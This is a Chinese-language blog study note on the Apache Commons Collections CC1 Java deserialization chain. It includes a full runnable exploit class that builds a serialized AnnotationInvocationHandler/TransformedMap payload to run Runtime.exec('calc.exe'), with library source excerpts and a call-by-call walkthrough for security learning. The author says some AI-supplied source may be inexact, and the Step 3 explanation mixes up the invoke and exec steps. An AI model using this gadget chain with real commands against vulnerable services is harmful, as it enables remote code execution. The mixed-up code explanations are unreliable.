---
title: CC链跟踪
date: 2025-11-13 19:00:00+08:00
draft: false
categories: ["技术"]
tags:
- 网络安全
- 漏洞
- 攻击链
permalink: agent-memory/个人随笔站点/site/content/posts/cc-链跟踪
---

# 你的文章正文内容，从这里开始...
### **写在前面：一份关于CC1调用链的个人学习笔记**

在您深入阅读本文档之前，笔者希望先分享几点说明：

要完全理解本文所剖析的调用链，建议您对Java中的一些基础概念有一定了解，例如 Map 接口、注解（Annotation）、反射（Reflection）以及 HashMap 的内部工作方式。尤其是，理解 **Map 结构与Java注解机制如何在此场景下协同工作，并最终为何会成为触发漏洞的关键**，是掌握整个攻击链的重中之重。

我本人也没有从事过Java开发，说实话也是东一榔头西一棒子的学习零散知识，本文并非原创性的漏洞研究，其内容是在安全领域前辈们（大神）已经完整梳理出攻击链的基础之上，并借助AI辅助学习和分析(源码不能确保百分百真实，但是逻辑经过我确认应该没问题的)，将整个调用流程一步步跟踪下来，旨在理清每一环节的执行逻辑与内在联系。

因此，这更像是一篇详细的学习笔记和思考过程的记录。希望能对同样在学习路上的朋友们有所启发，文中若有任何疏漏或不当之处，也恳请各位不吝赐教。

# 一、核心思想概述

"⚠️ 本测试方案仅用于安全研究与学习目的。任何未经授权的利用行为均违反法律，请务必在授权的测试环境中使用。"

**目标**：通过`AnnotationInvocationHandler`和`TransformedMap`构造恶意对象，在反序列化时触发`Runtime.exec()`执行任意命令。

### **✍️核心逻辑**：

1. 攻击者使用 `TransformedMap.decorate()` 方法，将一个包含恶意 `ChainedTransformer` 链的 `valueTransformer` 绑定到一个普通的 `HashMap` 上，构造出具有自动转换能力的恶意 `TransformedMap`。
2. 该 `ChainedTransformer` 链被精心设计为依次执行：获取 `Runtime.class` → 反射调用 `getRuntime()` → 获取 `Runtime` 实例 → 调用 `exec("calc")`，从而实现任意命令执行。
3. 攻击者通过反射创建 `AnnotationInvocationHandler` 实例，并将上述恶意 `TransformedMap` 作为其 `memberValues` 字段的值，使该 handler 在语义上“看起来像”一个合法的注解代理对象。
4. 攻击者将整个 `AnnotationInvocationHandler` 对象序列化，生成可传输的 payload，并发送给存在反序列化漏洞的目标服务。
5. 目标服务在反序列化该 payload 时，自动调用 `AnnotationInvocationHandler.readObject()` 方法；该方法会遍历 `memberValues.entrySet()`，并对每个条目进行类型校验。
6. 在反序列化过程中，`AnnotationInvocationHandler.readObject()`会遍历`memberValues`的键值对。当它尝试将`memberValues`中的值转换为注解定义的类型时，如果类型不匹配（如`String`被转换为`Integer`），JDK会自动调用`entry.setValue(newValue)`，来更新值，即使新旧值相同。这个动作恰好触发了我们预设的陷阱。
   💡不懂的强烈建议学下Map和注解是干什么的，其实最终目的就是为了解耦，本人也是Java小白
7. 而 `TransformedMap` 重写了 `entrySet()`，返回的是自定义的 `EntrySetView`；其迭代器 `TransformedMapEntryIterator` 会将原始 `Map.Entry` 包装为 `TransformedMapEntry`，并在构造时保存对 `TransformedMap` 自身（即 `parent`）的引用。
8. 因此，`e.setValue(newValue)` 实际调用的是 `TransformedMapEntry.setValue()`，该方法首先调用 `parent.checkSetValue(value)`，进而触发 `valueTransformer.transform(value)`。
9. 最终，绑定在 `TransformedMap` 中的 `ChainedTransformer` 链被执行，完成 `Runtime.getRuntime().exec("calc")` 的调用，实现远程命令执行（RCE）。

### 📝 漏洞原理"小结

> "漏洞本质：利用JDK反序列化过程中对`AnnotationInvocationHandler`的处理逻辑，结合Apache Commons Collections的`TransformedMap`的自动转换特性，实现任意命令执行。"

### 🧪测试环境说明：

- 建议在测试方案开头明确说明测试环境要求：

  > "测试环境要求：
  >
  > - 操作系统：Windows 10 / macOS 10.15 / Ubuntu 20.04
  > - JDK版本：JDK 8u66（或≤8u71的任意版本）
  > - 依赖库：commons-collections-3.2.1.jar"



# 二、完整调用链流程图

```
ois.readObject()
  │
  └→ sun.reflect.annotation.AnnotationInvocationHandler.readObject()
       │
       └→ 遍历 this.memberValues.entrySet()  // memberValues 是我们传入的 TransformedMap
            │
            └→ for each Map.Entry<String, Object> entry:
                 │
                 └→ entry.setValue(newValue)  ← 因类型校验失败触发自动 setValue（即使 newValue == value）
                      │
                      └→ org.apache.commons.collections.map.TransformedMap$TransformedMapEntry.setValue(Object)
                           │
                           └→ this.parent.checkSetValue(value)  ← parent = TransformedMap 实例
                                │
                                └→ TransformedMap.checkSetValue(Object)
                                     │
                                     └→ this.valueTransformer.transform(value)  ← 即 ChainedTransformer
                                          │
                                          └→ org.apache.commons.collections.functors.ChainedTransformer.transform(Object)
                                               │
                                               ├→ ConstantTransformer.transform(_) → returns Runtime.class
                                               ├→ InvokerTransformer("getMethod", ["getRuntime", []]).transform(Runtime.class)
                                               │    └→ Runtime.class.getMethod("getRuntime")
                                               ├→ InvokerTransformer("invoke", [null, []]).transform(Method)
                                               │    └→ Method.invoke(null) → returns Runtime.getRuntime()
                                               └→ InvokerTransformer("exec", ["calc.exe"]).transform(Runtime)
                                                    └→ Runtime.exec("calc.exe") 💥
```

# 三、**CC1 利用链核心组件解析**

 Apache Commons Collections 提供了“能做什么”（执行任意方法），而 AnnotationInvocationHandler 决定了“何时做”（在反序列化时自动触发）

## 3.1 Apache Commons Collections 反序列化漏洞（CC1）利用代码详解

**背景说明**：这段代码演示了如何利用 Apache Commons Collections 库中的 `TransformedMap` 和反射机制，在反序列化时执行任意命令（例如弹出 Windows 计算器 `calc.exe`）。这是经典的 **Java 反序列化漏洞（CVE-2015-4852）** 的利用方式之一，称为 **CommonsCollections1 (CC1)** 链。

```java
// Apache Commons Collections 1 (CC1) 反序列化漏洞利用演示
// ⚠️ 仅用于安全研究与学习！请勿用于非法用途。
// 依赖：commons-collections:commons-collections:3.1

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention; // JDK 内置注解，仅作占位使用
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/**
 * 漏洞原理简述：
 * 利用 Apache Commons Collections 中的 TransformedMap + AnnotationInvocationHandler，
 * 在反序列化过程中触发恶意 Transformer 链，最终执行任意命令（如 calc.exe）。
 */
public class CC1_Exploit {
    public static void main(String[] args) throws Exception {

        // ————————————————————————————————————————————————————————
        // 第一步：构造恶意的 Transformer 链（核心攻击载荷）
        // 目标：执行 Runtime.getRuntime().exec("calc.exe")
        // ————————————————————————————————————————————————————————
        Transformer[] transformers = new Transformer[]{
            // 1. 返回固定的 Runtime.class 对象
            new ConstantTransformer(Runtime.class),

            // 2. 调用 Runtime.class.getMethod("getRuntime", new Class[0])
            //    获取 getRuntime() 方法的 Method 对象
            new InvokerTransformer(
                "getMethod",
                new Class[]{String.class, Class[].class},      // getMethod 的参数类型
                new Object[]{"getRuntime", new Class[0]}       // 实际参数：方法名 + 参数类型数组
            ),

            // 3. 调用 Method.invoke(null, new Object[]{})
            //    执行静态方法 getRuntime()，返回 Runtime 实例
            new InvokerTransformer(
                "invoke",
                new Class[]{Object.class, Object[].class},     // invoke 的参数类型
                new Object[]{null, new Object[]{}}             // 静态方法调用，receiver 为 null
            ),

            // 4. 调用 Runtime.exec("calc.exe")，弹出计算器（Windows）
            new InvokerTransformer(
                "exec",
                new Class[]{String.class},                     // exec 的参数类型
                new Object[]{"calc.exe"}                       // 要执行的命令
            )
        };

        // 将多个 Transformer 串联成一个链式处理器
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        // ————————————————————————————————————————————————————————
        // 第二步：构造 TransformedMap，将恶意链绑定到 value 的转换器上
        // 当 Map 的 value 被访问或修改时，会自动触发 transformer
        // ————————————————————————————————————————————————————————
        Map<String, Object> innerMap = new HashMap<>();
        innerMap.put("value", "anything"); // 必须至少有一个 entry，否则不会触发转换

        // decorate(originalMap, keyTransformer, valueTransformer)
        // 这里只对 value 应用恶意 transformer
        Map<String, Object> transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);

        // ————————————————————————————————————————————————————————
        // 第三步：构造 AnnotationInvocationHandler 对象
        // 该类在反序列化时会调用 Map.entrySet()，从而触发 TransformedMap 的 value 转换
        // ————————————————————————————————————————————————————————
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true); // 绕过私有构造函数限制

        // 创建 handler 实例：
        // - 第一个参数：任意注解类（Retention 是 JDK 自带的，方便使用）
        // - 第二个参数：我们的恶意 transformedMap
        Object handler = constructor.newInstance(Retention.class, transformedMap);

        // ————————————————————————————————————————————————————————
        // 第四步：序列化 payload（生成攻击载荷）
        // ————————————————————————————————————————————————————————
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(handler); // 序列化恶意对象
        oos.close();
        byte[] payload = baos.toByteArray();

        System.out.println("✅ Payload 已生成，即将进行反序列化（触发命令执行）...");

        // ————————————————————————————————————————————————————————
        // 第五步：反序列化（模拟漏洞触发点）
        // 在真实场景中，这一步由存在漏洞的服务端执行
        // ————————————————————————————————————————————————————————
        ByteArrayInputStream bais = new ByteArrayInputStream(payload);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject(); // ⚠️ 关键触发点！此处会执行 calc.exe
        ois.close();

        System.out.println("✅ Done. 如果是 Windows 系统，应已弹出计算器。");
    }
}
```

#### 📄**漏洞触发大致流程**

1. 构造一条能执行命令的 `Transformer` 链。
2. 用 `TransformedMap` 包装该链，使其在 value 被访问时执行。
3. 将 `TransformedMap` 嵌入到 `AnnotationInvocationHandler` 中。
4. 序列化该 handler。
5. 反序列化时，JDK 自动调用 `entrySet()` → 触发 value 转换 → 执行命令！

## 3.2  AnnotationInvocationHandler 可序列化类源码

这段代码真实存在于 JDK 6、7、8u71 及更早版本中**，Object obj = ois.readObject(); // 关键：开始反序列化，**上面代码已经写出了漏洞的触发位置**

```
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    s.defaultReadObject(); // 1. 先读取父类和字段的默认值

    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch (IllegalArgumentException e) {
        memberValues = null;
        return;
    }

    // 2. 获取 memberValues 的 entrySet
    Map<String, Object> mv = memberValues;
    Set<Map.Entry<String, Object>> entries = mv.entrySet();
    // mv是AnnotationInvocationHandler的memberValues字段，此时是TransformedMap实例
// entrySet()返回TransformedMapEntry集合

    // 3. 遍历每个 entry，并调用 setValue
    for (Map.Entry<String, Object> e : entries) {
        String key = e.getKey();
        Object value = e.getValue();
        Class<?> type = annotationType.memberTypes().get(key);
        if (type != null) {
            Object newValue = type.cast(value); // 类型转换
            if (value != newValue) {            // 如果转型后是新对象（比如 enum 常量）
                e.setValue(newValue);           // ←←← 关键！这里调用了 entry.setValue()
                    // e是TransformedMapEntry实例，其setValue()方法被重写
    // 通过迭代器获取entry时，会自动包装为TransformedMapEntry
            }
        }
    }
}
```

------

🔍 逐行解释（重点在最后几行）

| 代码                                                      | 解释                                                |
| --------------------------------------------------------- | --------------------------------------------------- |
| `s.defaultReadObject();`                                  | 先正常读取对象字段（比如 `type` 和 `memberValues`） |
| `Map<String, Object> mv = memberValues;`                  | 拿到你之前塞进去的 `transformedMap`                 |
| `Set<Map.Entry<String, Object>> entries = mv.entrySet();` | 获取 map 的所有键值对（entry）                      |
| `for (Map.Entry<String, Object> e : entries)`             | 遍历每一个 entry（如 key="value", value="abc"）     |
| `e.setValue(newValue);`                                   | 如果值需要类型转换，就调用 `setValue` 更新它        |

> 💥 就是这一行：`e.setValue(newValue);` 触发了整个攻击链！

------

✅ 补充：

ℹ️ 为什么这个for循环一定会执行？
      因为我们的innerMap中预先put了一个键值对 (innerMap.put("value", "anything"))。如果没有这个条目，entrySet为空，for循环不执行，漏洞就无法触发。

⚠️“注意：单独使用 TransformedMap 无法直接被反序列化触发，必须配合如 AnnotationInvocationHandler 等可序列化类，其 readObject 会遍历 map 并调用 setValue。”，不是“只要反序列化 TransformedMap 就能触发”，这是常见误解

------

#### 🎯 关键点分析

✅ **唯一关键点：`memberValue.setValue(newValue)`**

- `memberValue` 是 `memberValues.entrySet()` 返回的 `Map.Entry`；

- 如果 `memberValues` 是 `TransformedMap`，那么 `entrySet()` 返回的是 **`EntrySetView`**；

- 其迭代器返回的是 **`TransformedMapEntry`**；

- 所以 `memberValue.setValue(...)` 实际调用的是：👉 **其实这几条链蛮复杂的后续我会跟踪链条的执行情况**

  ```
  TransformedMapEntry.setValue(newValue)
    → parent.checkSetValue(newValue)
      → valueTransformer.transform(newValue)
        → ChainedTransformer 执行命令
  ```

  ```
  memberValue.setValue(...)
  ```

> 💡 **因此，漏洞成立依赖两个条件同时满足**：
>
> 1. `memberValues` 是 `TransformedMap`（来自 Commons Collections ≤ 3.2.1）；
> 2. `AnnotationInvocationHandler.readObject()` 中存在 `entry.setValue()` 调用（JDK ≤ 8u71 或 7u85 等未修复版本）。

------

# 四、调用链分析

我按照调用链的先后顺序进行分析，也就是从传参进来的第一步开始，

## 4.1 mv.entrySet()

首先要知道mv是怎么来的，mv 是 AnnotationInvocationHandler 类中的成员变量 memberValues，怎么传进来的，就是这串代码，mv就是**transformedMap**实例。

```
// 构造 handler，将 transformedMap 作为 memberValues 传入 → mv = transformedMap
Object handler = constructor.newInstance(Retention.class, transformedMap);
```

 👉 就是 transformedMap.entrySet()   

### ℹ️4.1.1  **为什么 `e.setValue()` 会触发全链？**

#### ✅ **触发流程**

1. **反序列化时调用 `AnnotationInvocationHandler.readObject()`**：

   - 遍历 `memberValues.entrySet()`。
   - 对每个 `entry`，调用 `e.setValue(newValue)`。

2. **`e.setValue()` 调用链**：

   - `MapEntry.setValue(value)` → `parent.checkSetValue(value)`。

   - `parent` 是 `TransformedMap`，`checkSetValue(value)` 会调用 `valueTransformer.transform(value)`。

   - `valueTransformer` 是你设置的 `chainedTransformer`，它会依次执行 `ConstantTransformer` 和 `InvokerTransformer`。

     🤔这里其实带来了两个疑问：
     
       MapEntry是怎么由来的？
     
       以及parent 为什么是 TransformedMap ？

## 4.2 TransformedMap类

- 关键的部分：`TransformedMap` 类的定义、`decorate` 方法、`checkSetValue` 方法和 `entrySet` 相关逻辑，重要难理解的逻辑都在这个类里实现的。

### 📦 1. `TransformedMap` 类定义

```
public class TransformedMap
        extends AbstractInputCheckedMapDecorator
        implements Serializable {
```

- `TransformedMap` 是一个装饰器类，用来“包装”另一个 Map。
- 它继承自 `AbstractInputCheckedMapDecorator`，这个父类提供了对 `put` 和 `setValue` 的拦截能力。
- 实现了 `Serializable`，说明它可以被序列化和反序列化 —— **这是反序列化漏洞的前提**。

### 🔧 2. 成员变量

```
/** The transformer to use for keys */
protected final Transformer keyTransformer;
/** The transformer to use for values */
protected final Transformer valueTransformer;
```

- `keyTransformer`：用于转换 Map 的 key（可为 null）

- `valueTransformer`：用于转换 Map 的 value（我们攻击时用的就是它）

- `final` 表示一旦创建就不能改，保证了装饰器的行为稳定

  ✅ 在 ysoserial 中，我们把 `valueTransformer` 设为 `ChainedTransformer`，从而实现命令执行

### 🏗️ 3. 构造函数

```
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;//ChainedTransformer
}
```

- 调用父类构造函数 `super(map)`，把原始 map（innerMap）保存下来 👈
- 把传进来的两个 transformer 保存到成员变量r中👈
- 注意：这是 `protected`，不能直接 new，要用 `decorate` 工厂方法👈

### 🏭 4. 工厂方法 decorate（最常用入口）

- 静态方法，用来创建一个被包装的 Map

例如：

```
Map transformedMap = TransformedMap.decorate(new HashMap(), null, chainedTransformer);
```

## 4.3 entrySet ()

👉 **transformedMap.entrySet()**

```
public Set entrySet() {
    if (entrySet == null) {
        entrySet = new EntrySetView();
    }
    return entrySet;
}
```

- 返回这个 Map 的所有键值对集合
- `entrySet` 是懒加载的，第一次调用才创建
- 实际返回的是内部类 `EntrySetView`

EntrySetView 非常重要，他直接指向了另一个内部类👉 EntrySetView

## 4.3 EntrySetView(返回TransformedMapEntryIterator)

##### 🎯重写 `iterator()`，返回一个特殊的 `TransformedMapEntry` 迭代器

```
protected class EntrySetView extends AbstractSetDecorator {
    protected EntrySetView() {
        super(TransformedMap.this.map.entrySet())
    }
    // ...
}
```

- 继承自 `AbstractSetDecorator`，包装了原始 map 的 entrySet

- 所有操作都会转发给底层的 entrySet

- 但它会重写 `iterator()`，返回一个特殊的 `TransformedMapEntry` 迭代器 👉 **我觉得是最重要的是重写这个动作**

  🧐AnnotationInvocationHandler.readObject() 执行的问题。

##### ❓`mv.entrySet()`为什么会返回`TransformedMapEntry`类（MapEntry）。

##### ❓parent为什么是`transformedMap`。

------

MapEntry 核心代码就是`.setValue`方法，但是执行这个方法前，必须要解决上面两个问号

```
// AbstractInputCheckedMapDecorator.java
protected static class MapEntry extends AbstractMapEntryDecorator {
    private final Map parent;

    public MapEntry(MapEntry entry, Map parent) {
        super(entry);
        this.parent = parent; // parent 就是 transformedMap
    }

    public Object setValue(Object value) {
        // 👇 这里先检查 value 是否合法（会触发 transform）
        parent.checkSetValue(value);
        // 👇 再真正设置值
        return entry.setValue(value);
    }
}
```

### 4.3.1 super(TransformedMap.this.map.entrySet()); 

#### 🔍 1. 拆解表达式：`TransformedMap.this.map.entrySet()`

✅ TransformedMap.this.map

- **TransformedMap.this**: 这是Java内部类访问其外部类实例的标准语法。在这里，它指的就是我们创建的transformedMap对象本身。
- **.map**: transformedMap对象内部有一个从父类继承来的字段map，它储存着我们一开始传入的那个**原始的HashMap实例**（我们称之为innerMap）。
- **.entrySet()**: 因此，TransformedMap.this.map.entrySet()实际上等价于调用innerMap.entrySet()。它获取到的是**未经任何修饰的、HashMap原生的键值对集合（Set<Map.Entry>）**。
- **super(...)**: EntrySetView继承自AbstractSetDecorator。super()调用了**父类的构造函数**，把那个**原生的entrySet**交给了父类保管.

📄实际上，在 `TransformedMap` 继承的父类 `AbstractInputCheckedMapDecorator` 中，有一个字段：

```
protected final Map map; // 存的就是你传进来的 innerMap
```

👉 所以 `TransformedMap.this.map` 就是这个原始的 `Map`（例如 `new HashMap()`）

------

✅ `.entrySet()

- 调用原始 Map 的 `entrySet()` 方法
- 返回一个 `Set<Map.Entry<K, V>>`，即所有键值对的集合
- 例如，如果你 put 了 `"key" -> "value"`，那么 entrySet 就包含一个 entry：`key="key", value="value"`

所以：

```
TransformedMap.this.map.entrySet()
```

👉 **返回的是底层原始 Map 的所有键值对集合（未被装饰的原始 entrySet）**

------

#### 🏗️ 2. `super(...)`：调用父类构造函数

`EntrySetView` 继承自 `AbstractSetDecorator`，而 `AbstractSetDecorator` 的构造函数是：

```
public abstract class AbstractSetDecorator extends AbstractCollectionDecorator implements Set {
    public AbstractSetDecorator(Set set) {
        super(set);
    }
}
```

`AbstractCollectionDecorator` 的构造函数是：

```
public AbstractCollectionDecorator(Collection collection) {
    this.collection = collection; // 把传入的 collection 保存起来
}
```

所以：

```
super(TransformedMap.this.map.entrySet());
```

等价于：

```
// 把原始 map 的 entrySet 保存到父类的 collection 字段中
this.collection = TransformedMap.this.map.entrySet();
```

------

#### 🎯 3. 最终效果：装饰器模式的核心

通过这行代码，`EntrySetView` 实现了：

**“我看起来是一个 Set，但其实我只是包装了原始 Map 的 entrySet，并可以在操作时插入额外逻辑。”**

例如：

- 当你调用 `entrySet().iterator()` 时，

- `EntrySetView` 可以返回一个**自定义的 Iterator**，

- 这个 Iterator 返回的每个 `Map.Entry` 都是 `TransformedMapEntry`（而不是原始的 `HashMap$Node`），

- 而 `TransformedMapEntry.setValue()` 被重写，会触发 `checkSetValue()` → 触发 `transform`！

  👉 Ai 有时候就是太啰嗦，说人话就是重写了父类的迭代器iterator() 方法，至于怎么重写就看下面。

#### 📌 4.总结：super(....);做了什么

| 步骤 | 动作             | 说明                                                         |
| ---- | ---------------- | ------------------------------------------------------------ |
| 1    | 获取原始 Map     | `TransformedMap.this.map` 是你最初传给 `TransformedMap.decorate(...)` 的那个 `HashMap` |
| 2    | 获取其 entrySet  | `entrySet()` 返回原始键值对集合                              |
| 3    | 传给父类构造函数 | `super(...)` 把这个 entrySet 保存到父类的 `collection` 字段中 |
| 4    | 实现装饰器行为   | 后续对 `entrySet()` 的操作（如遍历、setValue）可以被拦截和增强 |

✅ **一句话总结**：
 这行代码把原始 Map 的 entrySet “委托”给父类保存，使得 `EntrySetView` 能在不改变原始数据结构的前提下，**动态增强 entry 的行为**（比如让 `setValue` 触发 transform），这是装饰器模式的典型应用，也是反序列化漏洞能触发的关键一环。

## 4.4 TransformedMapEntryIterator(重写父类迭代器)

### 4.4.1 🔍`iterator()` 是什么？

✅ 它是 Java 集合框架中的一个标准方法

所有实现了 `Iterable<T>` 接口的类（如 `List`, `Set`, `Map.EntrySet` 等）都必须提供一个：

```
Iterator<T> iterator();
```

- 这个方法的作用是：**返回一个可以遍历该集合中所有元素的对象（即 Iterator）**

例如：

```
Set<String> set = new HashSet<>();
set.add("A");
set.add("B");

Iterator<String> it = set.iterator(); // ← 调用 iterator()
while (it.hasNext()) {
    System.out.println(it.next()); // 输出 A, B
}
```

💡 `for-each` 循环（如 `for (Entry e : map.entrySet())`）底层就是调用 `iterator()`！

------

###  4.4.2 new TransformedMapEntryIterato(返回TransformedMapEntry)

🔧 在 `TransformedMap` 中，`entrySet()` 返回的是 `EntrySetView`（继承自 `AbstractSetDecorator`）。

而 `AbstractSetDecorator` 的 `iterator()` 方法默认是这样的：

```
// AbstractSetDecorator.java
public Iterator iterator() {
    return collection.iterator(); // 默认直接返回底层集合的 iterator
}
```

但！`TransformedMap` 的 `EntrySetView` **重写了 `iterator()` 方法**（在某些版本中是通过父类间接实现，但效果一样）：

✅ 实际逻辑（简化版）：

```
protected class EntrySetView extends AbstractSetDecorator {
    protected EntrySetView() {
        super(TransformedMap.this.map.entrySet());
    }

    @Override
    public Iterator iterator() {
        // 返回一个“包装过的” iterator
        return new TransformedMapEntryIterator(super.iterator());
    }
}
```

然后：

```
protected class TransformedMapEntryIterator implements Iterator {
    private final Iterator iterator;

    public TransformedMapEntryIterator(Iterator iterator) {
        this.iterator = iterator; // 原始 entry 的 iterator
    }

    @Override
    public Object next() {
        Map.Entry entry = (Map.Entry) iterator.next();
        // 把原始 entry 包装成 TransformedMapEntry！
        return new TransformedMapEntry(entry, TransformedMap.this);
    }

    @Override
    public boolean hasNext() {
        return iterator.hasNext();
    }
}
```

------

### 🎯 关键点：为什么这很重要？

因为：

- 原始 `HashMap` 的 `entrySet().iterator().next()` 返回的是 `HashMap$Node`（普通 Entry）

- 但 `TransformedMap` 的 `entrySet().iterator().next()` 返回的是 **`TransformedMapEntry`**

- 而 `TransformedMapEntry` **重写了 `setValue()` 方法**

  ```
  public Object setValue(Object value) {
      parent.checkSetValue(value); // ← 触发 transform！
      return entry.setValue(value);
  }
  ```

所以当你写：

```
for (Map.Entry e : transformedMap.entrySet()) {
    e.setValue("new value"); // 实际调用的是 TransformedMapEntry.setValue()
}
```

→ 就会触发 `checkSetValue()` → 触发 `valueTransformer.transform()` → 执行恶意代码！

🎯 总结：整个链条是如何串起来的？

| 步骤 | 代码                              | 效果                                         |
| ---- | --------------------------------- | -------------------------------------------- |
| 1    | `transformedMap.entrySet()`       | 返回 `EntrySetView`                          |
| 2    | `.iterator()`                     | 返回 `TransformedMapEntryIterator`           |
| 3    | `.next()`                         | 返回 `TransformedMapEntry`（包装过的 entry） |
| 4    | `e.setValue(...)`                 | 调用 `TransformedMapEntry.setValue(...)`     |
| 5    | `parent.checkSetValue(...)`       | 调用 `TransformedMap.checkSetValue(...)`     |
| 6    | `valueTransformer.transform(...)` | 执行 `ChainedTransformer` 攻击链             |
| 7    | 最终                              | `Runtime.exec("calc")` 💥                     |

## 4.5 e.setValue() 

### ✅parent是TransformedMap

### ✅e是TransformedMapEntry ↔️  MapEntry

```
// AbstractInputCheckedMapDecorator.MapEntry.setValue()
public Object setValue(Object value) {
    parent.checkSetValue(value); // parent 是 TransformedMap
    return entry.setValue(value);
}

// TransformedMap.checkSetValue()
protected Object checkSetValue(Object value) {
    if (valueTransformer != null) {
        return valueTransformer.transform(value); // 触发 chainedTransformer
    }
    return value;
}
```

 知道了为什么返回 TransformedMapEntry ↔️  MapEntry ，MapEntry 是 TransformedMapEntry 的父类，就是到parent形参是什么了。

👇下面是上面这段代码的执行逻辑

- `MapEntry.setValue(...)` 等同于`TransformedMapEntry.setValue(...)` 
- 根据`return new TransformedMapEntry(entry, TransformedMap.this);` 我们得出`parent = TransformedMap.this` 也就是 transformedMap实例
- 执行`setValue()`方法，这里面的逻辑是`parent.checkSetValue(value);` 也就是`transformedMap.checkSetValue(value);`
- `checkSetValue(Object value)`里面的逻辑是`valueTransformer.transform(value);`
- valueTransformer是chainedTransformer也就是`chainedTransformer.transform(value);`

## 4.6 transformedMap.checkSetValue(value)

转而执行checkSetValue(Object value)里面的逻辑valueTransformer.transform(value);

## 4.7 ChainedTransformer.transform()

valueTransformer是chainedTransformer也就是执行`chainedTransformer.transform(value);`

我们将深入 **Apache Commons Collections ≤ 3.2.1** 中的 `ChainedTransformer.transform()` 方法，**逐行解析其源码、执行逻辑和攻击链拼接原理**，并说明它如何一步步最终执行 `Runtime.getRuntime().exec("calc")`。

### 📦 背景：什么是 `ChainedTransformer`？

`ChainedTransformer` 是 Commons Collections 提供的一个 **组合型 Transformer**，它可以将多个 `Transformer` 按顺序串联起来，前一个的输出作为后一个的输入。

在漏洞利用中，攻击者将其构造为：

```
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

当调用 `chainedTransformer.transform(null)` 时，就会执行命令。

### 🔍 `ChainedTransformer.transform()` 源码（Commons Collections 3.2.1）

```
// org.apache.commons.collections.functors.ChainedTransformer

public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

其中：

- `iTransformers` 是构造时传入的 `Transformer[]` 数组；

- 初始 `object` 是调用者传入的参数（攻击中通常为 `null`）；

- 每一步的输出作为下一步的输入。

  

------

### 🧩 攻击链完整代码回顾

```
Transformer[] transformers = new Transformer[] {
    // Step 1: 返回 Runtime.class
    new ConstantTransformer(Runtime.class),

    // Step 2: 调用 Runtime.class.getMethod("getRuntime", new Class[0])
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),

    // Step 3: 调用 Method.invoke(null, new Object[0]) → 得到 Runtime 实例
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),

    // Step 4: 调用 runtime.exec("calc")
    new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"calc"})
};

ChainedTransformer chain = new ChainedTransformer(transformers);
chain.transform(null); // ← 触发整个链
```

### 🚶‍♂️ 逐行执行逻辑分析

我们模拟 `chain.transform(null)` 的执行过程：

#### 🔹 初始状态

```
Object object = null;
Transformer[] iTransformers = [ConstantTransformer, InvokerTransformer×3];
```

#### ✅ Step 1: `ConstantTransformer.transform(null)`

**源码**（`ConstantTransformer.java`）：

```
public Object transform(Object input) {
    return iConstant; // 直接返回构造时传入的常量
}
```

- 输入：`object = null`
- 执行：`return Runtime.class`
- 输出：`object = java.lang.Runtime.class`

> 💡 `ConstantTransformer` 忽略输入，直接返回固定值。

------

#### ✅ Step 2: `InvokerTransformer("getMethod", ...).transform(Runtime.class)`

```
public Object transform(Object input) {
    if (input == null) return null;
    try {
        Class<?> cls = input.getClass();                     // ← input = Runtime.class → cls = Class.class
        Method method = cls.getMethod(iMethodName, iParamTypes); // getMethod("getMethod", String.class, Class[].class)
        return method.invoke(input, iArgs);                  // invoke(Runtime.class, "getRuntime", new Class[0])
    } catch (Exception e) {
        throw new FunctorException(...);
    }
}
```

- 输入：`object = Runtime.class`
- `input.getClass()` → `Class.class`（因为 `Runtime.class` 是 `Class` 的实例）
- `getMethod("getMethod", String.class, Class[].class)` → 获取 `Class.getMethod` 方法
- `method.invoke(Runtime.class, "getRuntime", new Class[0])`
  - 等价于：`Runtime.class.getMethod("getRuntime", new Class[0])`
  - 返回：`java.lang.reflect.Method` 对象（代表 `Runtime.getRuntime()`）
- 输出：`object = Method<Runtime.getRuntime()>`

> ⚠️ 注意：这里调用的是 `Class.getMethod`，不是 `Runtime.getRuntime`！

------

#### ✅ Step 3: `InvokerTransformer("invoke", ...).transform(method)`

- 输入：`object = Runtime 实例`
- `input.getClass()` → `java.lang.Runtime`
- `getMethod("exec", String.class)` → 获取 `Runtime.exec(String)` 方法
- `method.invoke(runtime, "calc")`
  - 等价于：`runtime.exec("calc")`
  - 返回：`Process` 对象（但攻击者不关心返回值）
- 输出：`object = Process@xxxxxx`

> 💥 此时，`calc.exe` 已被启动！

------

### 🔄 执行流程总结

| 步骤 | Transformer 类型                  | 输入                 | 执行动作                                            | 输出                    |
| ---- | --------------------------------- | -------------------- | --------------------------------------------------- | ----------------------- |
| 1    | `ConstantTransformer`             | `null`               | 返回 `Runtime.class`                                | `Class<Runtime>`        |
